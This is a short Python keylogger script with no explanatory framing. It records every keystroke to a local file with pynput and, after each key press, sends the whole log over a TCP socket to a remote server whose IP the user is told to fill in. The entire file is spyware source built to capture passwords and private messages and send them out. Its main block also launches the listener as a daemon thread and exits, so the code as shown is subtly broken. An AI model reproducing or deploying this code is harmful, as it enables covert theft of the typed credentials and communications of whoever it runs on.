import pynput
from pynput.keyboard import Key, Listener
import socket
import threading

# Configuration
LOG_FILE = 'keylog.txt'
SERVER_IP = '192.168.1.100'  # Replace with your server's IP
SERVER_PORT = 12345

def log_key(key):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f'{key.char}')
        send_log()
    except AttributeError:
        if key == Key.space:
            with open(LOG_FILE, 'a') as f:
                f.write(' ')
        elif key == Key.backspace:
            with open(LOG_FILE, 'a') as f:
                f.write('[BACKSPACE]')
        elif key == Key.enter:
            with open(LOG_FILE, 'a') as f:
                f.write('\n')
        send_log()

def send_log():
    with open(LOG_FILE, 'r') as f:
        log_data = f.read()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(log_data.encode())
            print("Log sent to server")
    except Exception as e:
        print(f"Error sending log: {e}")

def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

def start_server_thread():
    threading.Thread(target=start_keylogger, daemon=True).start()

if __name__ == '__main__':
    start_server_thread()
